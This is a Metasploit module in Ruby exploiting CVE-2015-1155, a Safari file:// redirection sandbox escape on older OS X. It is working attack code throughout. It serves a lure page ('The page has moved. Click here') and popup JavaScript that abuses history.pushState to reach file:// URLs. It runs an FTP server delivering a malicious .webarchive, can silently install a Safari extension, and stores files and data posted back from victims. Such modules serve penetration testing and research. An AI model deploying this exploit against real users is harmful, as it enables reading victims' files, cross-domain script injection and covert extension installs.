##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/format/webarchive'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::FtpServer
  include Msf::Exploit::Format::Webarchive
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Mac OS X Safari file:// Redirection Sandbox Escape',
      'Description' => %q{
        Versions of Safari before 8.0.6, 7.1.6, and 6.2.6 are vulnerable to a
        "state management issue" that allows a browser window to be navigated
        to a file:// URL. By dropping and loading a malicious .webarchive file,
        an attacker can read arbitrary files, inject cross-domain Javascript, and
        silently install Safari extensions.
      },
      'License'     => MSF_LICENSE,
      'Author'      => [
        'joev' # discovery, module
      ],
      'References'  => [
        ['ZDI', '15-228'],
        ['CVE', '2015-1155'],
        ['URL', 'https://support.apple.com/en-us/HT204826']
      ],
      'Platform'    => 'osx',
      'DisclosureDate' => 'Jan 16 2014'
    ))


    register_options([
      OptString.new("URIPATH", [false, 'The URI to use for this exploit (default is random)']),
      OptPort.new('SRVPORT',   [true, "The local port to use for the FTP server", 8081]),
      OptPort.new('HTTPPORT',  [true, "The HTTP server port", 8080])
    ])
  end

  def lookup_lhost(c=nil)
    # Get the source address
    if datastore['SRVHOST'] == '0.0.0.0'
      Rex::Socket.source_address( c || '50.50.50.50')
    else
      datastore['SRVHOST']
    end
  end

  def on_request_uri(cli, req)
    if req.method =~ /post/i
      data_str = req.body.to_s
      begin
        data = JSON::parse(data_str || '')
        file = record_data(data, cli)
        send_response(cli, '')
        print_good "data #{data.keys.join(',')} received and stored to #{file}"
      rescue JSON::ParserError => e # json error, dismiss request & keep crit. server up
        file = record_data(data_str, cli)
        print_error "Invalid JSON stored in #{file}"
        send_response(cli, '')
      end
    elsif req.uri =~ /#{popup_path}$/
      send_response(cli, 200, 'OK', popup_html)
    else
      send_response(cli, 200, 'OK', exploit_html)
    end
  end

  def ftp_user
    @ftp_user ||= Rex::Text.rand_text_alpha(6)
  end

  def ftp_pass
    @ftp_pass ||= Rex::Text.rand_text_alpha(6)
  end

  def exploit_html
    %Q|
      <html><body>
      <script>
        window.onclick = function() {
          window.open(window.location+'/#{popup_path}', 'x', 'width=1,height=1');
        }
      </script>
      The page has moved. <a href='#'>Click here</a> to be redirected.
      </body></html>
    |
  end

  def ftp_url
    "ftp://#{ftp_user}:#{ftp_pass}@#{lookup_lhost}:#{datastore['SRVPORT']}"
  end

  def popup_html
    %Q|
    <script>

      function perform() {
        if (arguments.length > 0) {
          var nextArgs = Array.prototype.slice.call(arguments, 1);
          arguments[0]();
          setTimeout(function() {
            perform.apply(null, nextArgs);
          }, 300);
        }
      }

      perform(
        function() { opener.location = 'http://localhost:99999'; },
        function() { history.pushState.call(opener.history, {}, {}, 'file:///'); },
        function() { opener.location = 'about:blank' },
        function() { opener.history.back(); },
        function() { window.location = '#{ftp_url}'; },
        function() { opener.location = 'http://localhost:99998'; },
        function() {
          history.pushState.call(
            opener.history, {}, {},
            'file:///Volumes/#{lookup_lhost}/#{payload_name}'
          );
        },
        function() { opener.location = 'about:blank'; },
        function() { opener.history.back(); },
        function() { if (#{datastore['INSTALL_EXTENSION']}) { opener.postMessage('EXT', '*'); window.location = '#{apple_extension_url}'; } else { window.close(); } }
      )

     </script>
    |
  end

  #
  # Handle FTP LIST request (send back the directory listing)
  #
  def on_client_command_list(c, arg)
    conn = establish_data_connection(c)
    if not conn
      c.put("425 Can't build data connection\r\n")
      return
    end

    print_status("Data connection setup")
    c.put("150 Here comes the directory listing\r\n")

    print_status("Sending directory list via data connection #{webarchive_size}")
    month_names = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
    m = month_names[Time.now.month-1]
    d = Time.now.day
    y = Time.now.year

    dir = "-rwxr-xr-x 1 ftp ftp              #{webarchive_size} #{m} #{d}  #{y} #{payload_name}\r\n"
    print_status dir
    conn.put(dir)
    conn.close

    print_status("Directory sent ok")
    c.put("226 Transfer ok\r\n")

    return
  end

  #
  # Handle the FTP RETR request. This is where we transfer our actual malicious payload
  #
  def on_client_command_retr(c, arg)
    conn = establish_data_connection(c)
    if not conn
      return c.put("425 can't build data connection\r\n")
    end

    print_status("Connection for file transfer accepted")
    c.put("150 Connection accepted\r\n")

    # Send out payload
    conn.put(webarchive)
    conn.close
  end

  def volume_name
    @volume_name ||= Rex::Text.rand_text_alpha(12)
  end

  def payload_name
    'msf.webarchive'
  end

  def popup_path
    @popup_uri ||= Rex::Text.rand_text_alpha(12)
  end

  def webarchive
    webarchive_xml
  end

  def webarchive_size
    print_status "Webarchive_SiZE=#{webarchive_xml.length}"
    webarchive_xml.length
  end

  def run
    # Start the FTP server
    print_status("Running FTP service...")
    start_service

    # Create our own HTTP server
    # We will stay in this functino until we manually terminate execution
    start_http
  end

  #
  # Handle the HTTP request and return a response.  Code borrorwed from:
  # msf/core/exploit/http/server.rb
  #
  def start_http(opts={})
    # Ensture all dependencies are present before initializing HTTP
    use_zlib

    comm = datastore['ListenerComm']
    if (comm.to_s == "local")
      comm = ::Rex::Socket::Comm::Local
    else
      comm = nil
    end

    # Default the server host / port
    opts = {
      'ServerHost' => datastore['SRVHOST'],
      'ServerPort' => datastore['HTTPPORT'],
      'Comm'       => comm
    }.update(opts)

    # Start a new HTTP server
    @http_service = Rex::ServiceManager.start(
      Rex::Proto::Http::Server,
      opts['ServerPort'].to_i,
      opts['ServerHost'],
      datastore['SSL'],
      {
        'Msf'        => framework,
        'MsfExploit' => self,
      },
      opts['Comm'],
      datastore['SSLCert']
    )

    @http_service.server_name = datastore['HTTP::server_name']

    # Default the procedure of the URI to on_request_uri if one isn't
    # provided.
    uopts = {
      'Proc' => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
      'Path' => resource_uri
    }.update(opts['Uri'] || {})

    proto = (datastore["SSL"] ? "https" : "http")
    print_status("Using URL: #{proto}://#{opts['ServerHost']}:#{opts['ServerPort']}#{uopts['Path']}")

    if (opts['ServerHost'] == '0.0.0.0')
      print_status(" Local IP: #{proto}://#{Rex::Socket.source_address('1.2.3.4')}:#{opts['ServerPort']}#{uopts['Path']}")
    end

    # Add path to resource
    @service_path = uopts['Path']
    @http_service.add_resource(uopts['Path'], uopts)

    # As long as we have the http_service object, we will keep the ftp server alive
    while @http_service
      select(nil, nil, nil, 1)
    end
  end

  #
  # Ensures that gzip can be used.  If not, an exception is generated.  The
  # exception is only raised if the DisableGzip advanced option has not been
  # set.
  #
  def use_zlib
    if !Rex::Text.zlib_present? && datastore['HTTP::compression']
      fail_with(Failure::Unknown, "zlib support was not detected, yet the HTTP::compression option was set.  Don't do that!")
    end
  end

  #
  # Returns the configured (or random, if not configured) URI path
  #
  def resource_uri
    path = datastore['URIPATH'] || Rex::Text.rand_text_alphanumeric(8+rand(8))
    path = '/' + path if path !~ /^\//
    datastore['URIPATH'] = path
    return path
  end

  #
  # Create an HTTP response and then send it
  #
  def send_response(cli, code, message='OK', html='')
    proto = Rex::Proto::Http::DefaultProtocol
    res = Rex::Proto::Http::Response.new(code, message, proto)
    res['Content-Type'] = 'text/html'
    res.body = html

    cli.send_response(res)
  end

  # @param [Hash] data the data to store in the log
  # @return [String] filename where we are storing the data
  def record_data(data, cli)
    name = if data.is_a?(Hash) then data.keys.first else 'data' end
    file = File.basename(name).gsub(/[^A-Za-z]/,'')
    store_loot(
      file, "text/plain", cli.peerhost, data, "safari_webarchive", "Webarchive Collected Data"
    )
  end

  #
  # Kill HTTP/FTP (shut them down and clear resources)
  #
  def cleanup
    super

    # Kill FTP
    stop_service

    # clear my resource, deregister ref, stop/close the HTTP socket
    begin
      @http_service.remove_resource(datastore['URIPATH'])
      @http_service.deref
      @http_service.stop
      @http_service.close
      @http_service = nil
    rescue
    end
  end
end
